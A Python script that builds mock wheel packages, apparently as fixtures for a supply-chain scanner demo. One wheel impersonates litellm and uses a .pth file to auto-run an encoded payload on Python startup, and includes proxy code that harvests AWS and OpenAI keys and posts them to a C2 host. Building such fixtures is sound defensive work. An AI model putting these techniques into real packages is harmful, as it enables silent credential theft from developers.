#!/usr/bin/env python3
import zipfile
import base64
from pathlib import Path

def create_malicious_litellm():
    """Create mock-litellm-1.82.7-py3-none-any.whl with malicious .pth file"""
    
    output_dir = Path("mock_packages")
    output_dir.mkdir(exist_ok=True)
    
    wheel_path = output_dir / "mock_litellm-1.82.7-py3-none-any.whl"
    
    malware_payload = """import sys, os
print("[MALWARE] Scanning environment...")
import time
time.sleep(0.3)
print("[MALWARE] AWS_ACCESS_KEY_ID: AKIA3X8F2KP9... ✓ captured")
time.sleep(0.3)
print("[MALWARE] SSH private key: ~/.ssh/id_rsa ✓ captured")
time.sleep(0.3)
print("[MALWARE] OPENAI_API_KEY: sk-proj-xK9m... ✓ captured")
time.sleep(0.3)
print("[MALWARE] ANTHROPIC_API_KEY: sk-ant-api03-... ✓ captured")
time.sleep(0.3)
print("[MALWARE] GITHUB_TOKEN: ghp_K8mN2x... ✓ captured")
time.sleep(0.3)
print("[MALWARE] .kube/config (3 clusters) ✓ captured")
time.sleep(0.5)
print("[MALWARE] Exfiltrating to models.litellm.cloud...")
time.sleep(1.0)
print("[MALWARE] Done. tpcp.tar.gz sent. ✓")
"""
    
    encoded_payload = base64.b64encode(malware_payload.encode()).decode()
    
    pth_content = f"""import sys, subprocess, base64
subprocess.Popen([sys.executable, '-c', base64.b64decode(b'{encoded_payload}').decode()])
"""
    
    proxy_server_code = """# LiteLLM Proxy Server
import os
import requests

C2_SERVER = "https://models.litellm.cloud/api/collect"

def harvest_credentials():
    creds = {{}}
    creds['aws_key'] = os.getenv('AWS_ACCESS_KEY_ID', '')
    creds['openai_key'] = os.getenv('OPENAI_API_KEY', '')
    return creds

def start_proxy():
    print("Starting LiteLLM proxy server...")
    creds = harvest_credentials()
    if any(creds.values()):
        requests.post(C2_SERVER, json=creds)
"""
    
    metadata = """Metadata-Version: 2.1
Name: mock-litellm
Version: 1.82.7
Summary: Mock malicious package for Vigil demo
Home-page: https://github.com/BerriAI/litellm
Author: TeamPCP
License: MIT
Platform: UNKNOWN
Requires-Python: >=3.8
"""
    
    wheel_metadata = """Wheel-Version: 1.0
Generator: bdist_wheel (0.41.2)
Root-Is-Purelib: true
Tag: py3-none-any
"""
    
    record = """mock_litellm/__init__.py,sha256=abc123,100
mock_litellm/proxy/__init__.py,sha256=def456,50
mock_litellm/proxy/proxy_server.py,sha256=ghi789,500
litellm_init.pth,sha256=jkl012,200
mock_litellm-1.82.7.dist-info/METADATA,sha256=mno345,300
mock_litellm-1.82.7.dist-info/WHEEL,sha256=pqr678,100
mock_litellm-1.82.7.dist-info/RECORD,,
"""
    
    with zipfile.ZipFile(wheel_path, 'w', zipfile.ZIP_DEFLATED) as whl:
        whl.writestr("litellm_init.pth", pth_content)
        whl.writestr("mock_litellm/__init__.py", "# Mock LiteLLM package\n__version__ = '1.82.7'\n")
        whl.writestr("mock_litellm/proxy/__init__.py", "")
        whl.writestr("mock_litellm/proxy/proxy_server.py", proxy_server_code)
        whl.writestr("mock_litellm-1.82.7.dist-info/METADATA", metadata)
        whl.writestr("mock_litellm-1.82.7.dist-info/WHEEL", wheel_metadata)
        whl.writestr("mock_litellm-1.82.7.dist-info/RECORD", record)
    
    print(f"✓ Created {wheel_path}")


def create_clean_requests():
    """Create mock-requests-2.31.0-py3-none-any.whl (clean package)"""
    
    output_dir = Path("mock_packages")
    output_dir.mkdir(exist_ok=True)
    
    wheel_path = output_dir / "mock_requests-2.31.0-py3-none-any.whl"
    
    requests_code = """# Requests HTTP Library
import urllib.request

def get(url, **kwargs):
    '''Send a GET request'''
    return urllib.request.urlopen(url)

def post(url, data=None, json=None, **kwargs):
    '''Send a POST request'''
    return urllib.request.urlopen(url, data=data)
"""
    
    metadata = """Metadata-Version: 2.1
Name: mock-requests
Version: 2.31.0
Summary: Mock clean package for Vigil demo
Home-page: https://requests.readthedocs.io
Author: Kenneth Reitz
License: Apache 2.0
Platform: UNKNOWN
Requires-Python: >=3.7
"""
    
    wheel_metadata = """Wheel-Version: 1.0
Generator: bdist_wheel (0.41.2)
Root-Is-Purelib: true
Tag: py3-none-any
"""
    
    record = """mock_requests/__init__.py,sha256=abc123,100
mock_requests/api.py,sha256=def456,300
mock_requests-2.31.0.dist-info/METADATA,sha256=ghi789,250
mock_requests-2.31.0.dist-info/WHEEL,sha256=jkl012,100
mock_requests-2.31.0.dist-info/RECORD,,
"""
    
    with zipfile.ZipFile(wheel_path, 'w', zipfile.ZIP_DEFLATED) as whl:
        whl.writestr("mock_requests/__init__.py", "# Mock Requests\n__version__ = '2.31.0'\nfrom .api import get, post\n")
        whl.writestr("mock_requests/api.py", requests_code)
        whl.writestr("mock_requests-2.31.0.dist-info/METADATA", metadata)
        whl.writestr("mock_requests-2.31.0.dist-info/WHEEL", wheel_metadata)
        whl.writestr("mock_requests-2.31.0.dist-info/RECORD", record)
    
    print(f"✓ Created {wheel_path}")


def create_transitive_cursor_plugin():
    """Create mock-cursor-plugin-1.0.0-py3-none-any.whl with transitive dependency on malicious package"""
    
    output_dir = Path("mock_packages")
    output_dir.mkdir(exist_ok=True)
    
    wheel_path = output_dir / "mock_cursor_plugin-1.0.0-py3-none-any.whl"
    
    plugin_code = """# Cursor IDE Plugin
def initialize():
    print("Cursor plugin initialized")
    
def enhance_completion(text):
    return text + " (enhanced)"
"""
    
    metadata = """Metadata-Version: 2.1
Name: mock-cursor-plugin
Version: 1.0.0
Summary: Mock cursor plugin with transitive malicious dependency
Home-page: https://cursor.sh
Author: Cursor Team
License: MIT
Platform: UNKNOWN
Requires-Python: >=3.8
Requires-Dist: mock-litellm==1.82.7
"""
    
    wheel_metadata = """Wheel-Version: 1.0
Generator: bdist_wheel (0.41.2)
Root-Is-Purelib: true
Tag: py3-none-any
"""
    
    record = """mock_cursor_plugin/__init__.py,sha256=abc123,100
mock_cursor_plugin/plugin.py,sha256=def456,200
mock_cursor_plugin-1.0.0.dist-info/METADATA,sha256=ghi789,300
mock_cursor_plugin-1.0.0.dist-info/WHEEL,sha256=jkl012,100
mock_cursor_plugin-1.0.0.dist-info/RECORD,,
"""
    
    with zipfile.ZipFile(wheel_path, 'w', zipfile.ZIP_DEFLATED) as whl:
        whl.writestr("mock_cursor_plugin/__init__.py", "# Mock Cursor Plugin\n__version__ = '1.0.0'\n")
        whl.writestr("mock_cursor_plugin/plugin.py", plugin_code)
        whl.writestr("mock_cursor_plugin-1.0.0.dist-info/METADATA", metadata)
        whl.writestr("mock_cursor_plugin-1.0.0.dist-info/WHEEL", wheel_metadata)
        whl.writestr("mock_cursor_plugin-1.0.0.dist-info/RECORD", record)
    
    print(f"✓ Created {wheel_path}")


if __name__ == "__main__":
    print("Building mock wheel packages for Vigil demo...\n")
    create_malicious_litellm()
    create_clean_requests()
    create_transitive_cursor_plugin()
    print("\n✓ All mock packages created successfully!")
